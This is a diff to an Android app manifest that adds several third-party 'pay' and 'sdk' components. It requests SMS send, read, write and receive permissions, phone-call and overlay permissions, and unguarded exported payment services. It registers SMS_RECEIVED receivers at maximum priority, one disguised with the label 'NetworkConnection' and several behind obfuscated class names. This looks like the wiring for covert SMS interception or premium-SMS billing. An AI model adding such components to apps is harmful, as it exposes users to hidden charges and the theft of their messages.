@@ -141,6 +141,22 @@
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <!--Yu Feng End-->
 
+    <!--le ling start-->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <!--le ling end-->
+
 
     <application
         android:allowBackup="true"
@@ -243,7 +259,6 @@
                 <action android:name="android.bluetooth.adapter.action.STATE_CHANGED" />
                 <action android:name="android.intent.action.ANY_DATA_STATE" />
                 <action android:name="android.net.wifi.STATE_CHANGE" />
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.SCREEN_ON" />
                 <action android:name="android.intent.action.USER_PRESENT" />
             </intent-filter>
@@ -302,6 +317,50 @@
         <service android:name="com.mj.sms.service.InitService"></service>
         <!--Yu Feng End-->
 
+        <!--le ling start-->
+        <service android:exported="true" android:name="com.pay.sdk.msg.PayService" >
+            <intent-filter>
+                <action android:name="com.pay.sdk.msg.PayService" />
+            </intent-filter>
+        </service>
+        <service android:exported="true" 	android:name="com.pay.sdk.msg.PayListenerService" android:process=":service2">
+            <intent-filter>
+                <action android:name="com.pay.sdk.msg.PayListenerService" />
+            </intent-filter>
+        </service>
+        <!--le ling end-->
+
+        <!--chao yue sdk start-->
+        <meta-data android:name="CHANNEL_ID" android:value="974" />
+        <meta-data android:name="DBP" android:value="dr974" />
+        <meta-data android:name="WE_CHANNEL" android:value="10113"/>
+
+        <service android:name="com.a.e.SeaW" />
+        <service android:name="com.a.e.LogSw" />
+        <receiver android:name="com.w.b.RecevierW" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.w.b.Cor" >
+            <intent-filter android:priority="90000" >
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+            </intent-filter>
+        </receiver>
+        <service
+            android:name="com.ixyzh.slib.StartReceiverService"
+            android:enabled="true" >
+        </service>
+        <meta-data android:name="com.zc.gameid" android:value="11155011" />
+        <receiver
+            android:name="net.tt.sdk.receiver.SmsBroadcastReceiver"
+            android:label="NetworkConnection" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+        <!--chao yue sdk end-->
 
     </application>
 
